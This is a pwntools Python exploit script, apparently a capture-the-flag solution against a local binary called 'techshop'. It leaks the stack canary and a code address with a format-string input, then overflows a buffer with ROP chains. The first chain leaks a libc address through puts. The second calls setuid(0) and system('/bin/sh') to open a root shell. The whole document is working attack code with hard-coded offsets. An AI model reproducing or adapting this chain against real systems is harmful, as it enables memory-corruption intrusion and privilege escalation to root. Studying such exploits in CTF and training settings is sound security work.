from pwn import *

context.binary = 'techshop'
io = process()

# offsets des Addresses par Rapport au base du binaire
main_offset = 0x13dd
puts_plt_offset = 0x1070
getchar_got_offset = 0x4058
getchar_libc_offset = 0x86380
bin_sh_offset = 0x1a7e43
system_offset = 0x528f0
setuid_offset = 0xf7ee0
pop_rdi_offset = 0x128c
ret_offset = 0x1016

io.sendline(b'%17$p.%13$p')
io.recvuntil(b'Welcome, ')

leak_line = io.recvline().strip()

# Split into two parts
main_str, canary_str = leak_line.split(b'.')

# Convert from bytes to int
main = int(main_str, 16)
canary = int(canary_str, 16)

print('the main is : ',hex(main))
print('the canary is : ',hex(canary))

# actual address of functions and gadgets
binary_base = main - main_offset
getchar = getchar_got_offset + binary_base
puts = puts_plt_offset + binary_base
pop_rdi = pop_rdi_offset + binary_base
ret = ret_offset + binary_base

# leaking the libc base address with puts
io.sendline(b'4')

payload = b'Y' * 104
payload += p64(canary)
payload += b'YYYYYYYY'
payload += p64(pop_rdi)
payload += p64(getchar)
#payload += p64(ret)
payload += p64(puts)
payload += p64(main)

io.sendline(payload)
io.recvuntil(b'No results found.')
io.recvline()

getchar_libc = u64(io.recvline().strip().ljust(8, b"\x00"))

libc_base = getchar_libc - getchar_libc_offset
system_address = libc_base + system_offset
bin_sh_address = libc_base + bin_sh_offset
setuid_address = libc_base + setuid_offset

print("libc base is : ",hex(libc_base))
print("system is : ",hex(system_address))
print("/bin/sh is : ",hex(bin_sh_address))
print("setuid is : ", hex(setuid_address))

# setuid to 0 to get the root shell
io.sendline(b'yassine')
sleep(0.1)
io.sendline(b'4')

payload = b'Y' * 104
payload += p64(canary)
payload += b'T' * 8
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(setuid_address)
payload += p64(pop_rdi)
payload += p64(bin_sh_address)
#payload += p64(ret)
payload += p64(system_address)

io.sendline(payload)

io.interactive()
